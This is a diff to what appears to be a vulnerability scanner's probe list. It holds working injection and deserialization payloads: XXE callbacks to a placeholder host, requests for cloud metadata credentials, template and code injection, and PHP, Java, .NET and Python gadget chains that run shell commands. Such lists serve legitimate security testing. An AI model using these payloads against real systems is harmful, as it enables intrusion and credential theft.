@@ -12,7 +12,6 @@ javascript:alert(1337)//";alert(1337)//';alert(1337)//`alert(1337)`//--></script
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://{domain}/evil.dtd">%dtd;%payload;]><foo>&exfil;</foo>
 <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "1337">]><foo>&a;</foo>
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://metadata.google.internal/computeMetadata/v1/
 http://169.254.169.254/metadata/instance?api-version=2021-02-01
@@ -141,16 +140,15 @@ test\0admin
 {7*191}
 {math equation="7*191"}
 {math equation="7 * 191"}
-{!!7*191!!}
 = 7 * 191
 [[${7*191}]]
-[[${T(java.lang.Math).abs(-1337)}]]
+[[${T(java.lang.Math).multiplyExact(7,191)}]]
 *{7*191}
 {{"".class.forName("java.lang.Math").getMethod("abs",long.class).invoke(null,-1337)}}
 @(7*191)
 @(System.Math.Abs(-1337))
-{{printf "%d" 1337}}
-{{html 1337}}
+{{multiply 7 191}}
+{{add 1336 1}}
 loadstring("return 7*191")()
 assert(loadstring('return 7*191'))()
 loadstring("error('1337')")()
@@ -159,8 +157,7 @@ local s=os.clock();while os.clock()-s<5 do end
 require('socket').sleep(5)
 require("socket").connect("{domain}", 80)
 require("socket.http").request("http://{domain}/lua")
-assert(system('echo 1337'))
-preg_replace('/.*/e','system("echo 1337")','')
+system('expr 7 \\* 191')
 create_function('','return 7*191;')()
 assert(sleep(5)||1)
 assert(file_get_contents('http://{domain}/php'))
@@ -362,11 +359,16 @@ admin'//
 ' OR 1=1 RETURN u.password //
 ') OR 1=1 RETURN u.password AS x //
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnc3RyKDcqMTkxKScKdFIu
 gAJjX19idWlsdGluX18KZXZhbApxAFgFAAAANyoxOTFxAYVxAlJxAy4=
 gASVIQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwFNyoxOTGUhZRSlC4=
 !!python/object/apply:builtins.eval ["7*191"]
+!!python/object/apply:builtins.eval ["str(7*191)"]
 {"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["7*191"]}]}
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["str(7*191)"]}]}
 O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"\0*\0events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"\0*\0listeners";a:1:{s:8:"shutdown";a:1:{i:0;s:6:"system";}}}s:8:"\0*\0event";s:21:"nslookup {domain}";}
 O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"\0Symfony\Component\Cache\Adapter\ProxyAdapter\0pool";O:44:"Symfony\Component\Cache\Adapter\ArrayAdapter":3:{s:54:"\0Symfony\Component\Cache\Adapter\ArrayAdapter\0values";a:0:{}s:60:"\0Symfony\Component\Cache\Adapter\ArrayAdapter\0expiration";a:0:{}s:21:"\0*\0createCacheItem";a:2:{i:0;O:15:"Faker\Generator":1:{s:13:"\0*\0formatters";a:1:{s:11:"fetchObject";s:6:"system";}}i:1;s:11:"fetchObject";}}s:58:"\0Symfony\Component\Cache\Adapter\ProxyAdapter\0setInner";s:9:"echo 1337";}
 {"rce":"_$$ND_FUNC$$_function(){return 7*191}()"}
 {"rce":"_$$ND_FUNC$$_function(){return eval('7*191')}()"}
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>expr 7 \* 191</string></void></array><void method="start"/></object></java>
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c set /a 7*191"}}}
